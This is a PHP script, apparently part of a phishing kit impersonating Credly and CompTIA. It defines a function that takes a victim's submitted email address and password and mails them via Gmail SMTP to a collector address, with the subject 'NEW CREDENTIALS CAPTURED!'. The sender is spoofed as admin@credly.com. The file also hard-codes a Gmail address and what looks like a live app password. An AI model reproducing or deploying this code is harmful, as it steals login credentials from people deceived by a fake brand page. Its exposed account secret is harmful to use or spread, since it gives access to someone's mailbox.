<?php
// send_mail.php

// Required PHPMailer files
require_once 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Create a function that accepts the email and password variables
function send_credentials_email($user_email, $user_password)
{

    $mail = new PHPMailer(true);

    try {
        // Server settings (Your specific Gmail/SMTP settings)
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port       = 465;

        // AUTHENTICATION: Use your Gmail Address and App Password!
        $mail->Username   = 'daniel.dedios011@gmail.com';
        $mail->Password   = 'kozgcrkkoyetfdpl
';

        // Recipients
        $mail->setFrom('admin@credly.com', 'COMPTIA via Credly');
        $mail->addAddress('daniel.dedios011@gmail.com'); // Recipient is your Gmail

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'NEW CREDENTIALS CAPTURED!';
        $mail->Body    = "
            <h1>New Credentials Captured!</h1>
            <p><strong>Email:</strong> " . htmlspecialchars($user_email) . "</p>
            <p><strong>Password:</strong> " . htmlspecialchars($user_password) . "</p>
            <p>Timestamp: " . date("Y-m-d H:i:s") . "</p>
        ";

        $mail->send();
        return true; // Return true on success

    } catch (Exception $e) {
        // Log the error securely without showing it to the user
        error_log("Mailer Error: {$mail->ErrorInfo}");
        return false; // Return false on failure
    }
}
